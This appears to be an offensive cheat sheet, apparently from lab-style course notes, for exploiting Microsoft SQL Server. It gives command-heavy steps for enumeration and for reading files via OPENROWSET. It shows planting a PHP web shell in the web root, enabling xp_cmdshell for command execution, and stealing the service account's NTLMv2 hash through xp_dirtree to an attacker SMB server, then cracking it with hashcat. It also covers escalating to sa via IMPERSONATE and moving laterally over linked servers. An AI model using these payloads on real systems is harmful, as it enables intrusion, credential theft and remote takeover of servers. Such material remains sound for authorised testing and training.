# General Informations
```
Default TCP port 1433 & UDP port 1434. Can operate in "hidden" mode using TCP/2433 port

# Default databases
- master - keeps the information for an instance of SQL Server.

- msdb - used by SQL Server Agent.

- model - a template database copied for each new database.

- resource - a read-only database that keeps system objects visible in every database on the server in sys schema.

- tempdb - keeps temporary objects for SQL queries.

```


# Enumeration
```
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -Pn -p 1433 $IP

# using Metasploit
msf6> use auxiliary/scanner/mssql/mssql_ping
```


# Interacting w/ service
```
# Enumerate SQL Admin Rights w/ Cypher Query in BloodHound
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2

# From Linux
mssqlclient.py -p 1433 user@$IP
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
sqsh -S $IP -U user -P password -h
sqsh -S $IP -U .\\\\user -P 'Password' -h # Target local account


# From Windows
sqlcmd -S SRVMSSQL -U user -P 'Password' -y 30 -Y 30

# Or using https://github.com/SnaffCon/Snaffler

# Hunt for MSSQL Instances w/ PowerUpSQL.ps1
PS C:\htb>  Import-Module .\PowerUpSQL.ps1
PS C:\htb>  Get-SQLInstanceDomain

# Authenticate against a found MSSQL Instance w/ PowerUpSQL.ps1
PS C:\htb>  Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```

# MSSQL Commands

|Commands|**Description**|
|---|---|
|`select name from sys.databases`|List all the databases.|
|`SELECT name FROM master.dbo.sysdatabases`|Show databases|
|`USE master`|Use database “master”.|
|`select @@version;`|Get version|
|`select user_name();`|Get user|
|`SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;`|Get tables name|
|`SELECT * FROM users`|Select all Data from table “users”|

# Read Local Files
```
# By default, MSSQL allows file read on any file in the operating system to which the account has read access.

1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```


# Write Local Files
```
# To write files using MSSQL, we need to enable "Ole Automation Procedures"(https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), which requires admin privileges :

1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO

# Then we can create our file :

1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\\inetpub\\wwwroot\\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```


# RCE

`MSSQL` has a [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15) called [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) which allow us to execute system commands using SQL.

Keep in mind the following about `xp_cmdshell`:

- `xp_cmdshell` is a powerful feature and disabled by default. `xp_cmdshell` can be enabled and disabled by using the [Policy-Based Management](https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration) or by executing [sp_configure](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option)
- The Windows process spawned by `xp_cmdshell` has the same security rights as the SQL Server service account
- `xp_cmdshell` operates synchronously. Control is not returned to the caller until the command-shell command is completed

```bash
1> xp_cmdshell 'whoami'
2> GO

output
-----------------------------
no service\\mssql$sqlexpress
NULL
(2 rows affected)
```

- If `xp_cmdshell` is not enabled, we can enable it, if we have the appropriate privileges, using the following command :
```
-- To allow advanced options to be changed.
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.
RECONFIGURE
GO

-- To enable the feature.
EXECUTE sp_configure 'xp_cmdshell', 1
GO

-- To update the currently configured value for this feature.
RECONFIGURE
GO
```

# Capture MSSQL Service Hash
We can create a fake SMB server to steal the MSSQL Service Hash using `xp_subdirs` or `xp_dirtree` undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system.

When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the `NTLMv2` hash of the service account that is running the SQL Server.

We first need to start our SMB server, using either [Responder](https://github.com/lgandx/Responder) or [impacket-smbserver](https://github.com/SecureAuthCorp/impacket) :
```bash
# Using Responder
sudo responder -I tun0

# Using Impacket-SMBserver :
impacket-smbserver share ./ -smb2support
```

Then we can execute one of the following SQL queries :
```bash
# XP_DIRTREE Hash Stealing
1> EXEC master..xp_dirtree '\\\\10.10.110.17\\share\\'
2> GO

subdirectory    depth
--------------- -----------

# XP_SUBDIRS Hash Stealing
1> EXEC master..xp_subdirs '\\\\10.10.110.17\\share\\'
2> GO

HResult 0x55F6, Level 16, State 1
xp_subdirs could not access '\\\\10.10.110.17\\share\\*.*': FindFirstFile() returned error 5, 'Access is denied.'
```

If the service account has access to our server, we will obtain its hash. We can then attempt to crack the hash or relay it to another host.
```
sudo impacket-smbserver share ./ -smb2support

Impacket 
<SNIP...>
[*] mssqlsvc::WIN-02:aaaaaaaaaaaaaaaa:255f615600e5ac0bae09f80daed8d33a:010100000000000000b1dacda669da01dd8c89dc1ee1dc6c00000000010010004a006a006d00630070006a0067006f00030010004a006a006d00630070006a0067006f0002001000660071006900710047007a005500420004001000660071006900710047007a00550042000700080000b1dacda669da0106000400020000000800300030000000000000000000000000300000950719917418c70e3d12224fc1ef5c7d5b9f2117c3f438b07ae5087ce787890a0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310035002e003100360030000000000000000000
```

It will give us `NetNTLMv2` hash, which hashcat code is `-m 5600` :
```
# Add all content in file, not just hash

echo "MSSQLSVC::WIN-02:aaaaaaaaaaaaaaaa:255f615600e5ac0bae09f80daed8d33a:010100000000000000b1dacda669da01dd8c89dc1ee1dc6c00000000010010004a006a006d00630070006a0067006f00030010004a006a006d00630070006a0067006f0002001000660071006900710047007a005500420004001000660071006900710047007a00550042000700080000b1dacda669da0106000400020000000800300030000000000000000000000000300000950719917418c70e3d12224fc1ef5c7d5b9f2117c3f438b07ae5087ce787890a0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310035002e003100360030000000000000000000" > ./hash.txt

hashcat -m 5600 -a 0 hash /usr/share/wordlists/rockyou.txt --show
```

# Impersonate Existing Users with MSSQL

SQL Server has a special permission, named `IMPERSONATE`, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends, leading to prvilege escalation.

Sysadmins can impersonate anyone by default, but for non-administrator users, privileges must be explicitly assigned.

### Identify Users That We Can Impersonat
```bash
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------
sa
ben
valentin

(3 rows affected)
```

To get an idea of privilege escalation possibilities, let's verify if our current user has the sysadmin role :

### Verify our Current User and Role
```bash
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-----------
julio                                                                                                                    

(1 rows affected)

-----------
          0

(1 rows affected)
```

As the returned value `0` indicates, we do not have the sysadmin role, but we can still impersonate the `sa` user since the command complete successfully.

Let us impersonate the `sa` user and execute the commands
```bash
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa

(1 rows affected)

-----------
          1

(1 rows affected)
```

We can now execute any command as a sysadmin as the returned value `1` indicates. To revert the operation and return to our previous user, we can use the Transact-SQL statement `REVERT`.

**Note:** It's recommended to run `EXECUTE AS LOGIN` within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using `USE master`.

**Note 2:** If we find a user who is not sysadmin, we can still check if the user has access to other databases or linked servers.

We can then find if others servers are linked !

# Communicate w/ Other Databases (after Impersonate) - Linked Servers

`MSSQL` has a configuration option called [linked servers](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine) which can enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.

If we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server. Administrators can configure a linked server using credentials from the remote server. If those credentials have sysadmin privileges, we may be able to execute commands in the remote SQL instance.

```bash
# Identify Linked Servers in MSSQL :
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\\SQLEXPRESS          1
10.0.0.12\\SQLEXPRESS                0

(2 rows affected)
```

We can find the server name, and the column `isremote`, where `1` means is a remote server, and `0` is a linked server.

We can then try to identify the user used for the connection and its privileges, to see if he has `sysadmin privileges` . For this, we’ll use the `EXECUTE` command to execute command from the linked server :

```bash
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\\SQLEXPRESS]
2> GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1
 
(1 rows affected)
```

As we have seen, we can now execute queries with sysadmin privileges on the linked server (as the `1` indicates).

As `sysadmin`, we control the SQL Server instance. We can read data from any database or execute system commands with `xp_cmdshell`.

**Note:** If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).

- We can now for example read files with the `sysadmin privileges` from the linked server using still the `EXECUTE` command + the `READ FILES` command from above :

```bash
1> EXECUTE('SELECT * FROM OPENROWSET(BULK ''C:/Users/Administrator/Desktop/flag.txt'', SINGLE_CLOB) AS Contents') AT [10.0.0.12\\SQLEXPRESS]
2> GO
```

# Dangerous Settings :

When an admin initially installs and configures MSSQL to be network accessible, the SQL service will likely run as `NT SERVICE\\MSSQLSERVER`. Connecting from the client-side is possible through Windows Authentication, and by default, encryption is not enforced when attempting to connect.

- MSSQL clients not using encryption to connect to the MSSQL server
- The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates
- The use of [named pipes](https://docs.microsoft.com/en-us/sql/tools/configuration-manager/named-pipes-properties?view=sql-server-ver15)
- Weak & default `sa` credentials. Admins may forget to disable this account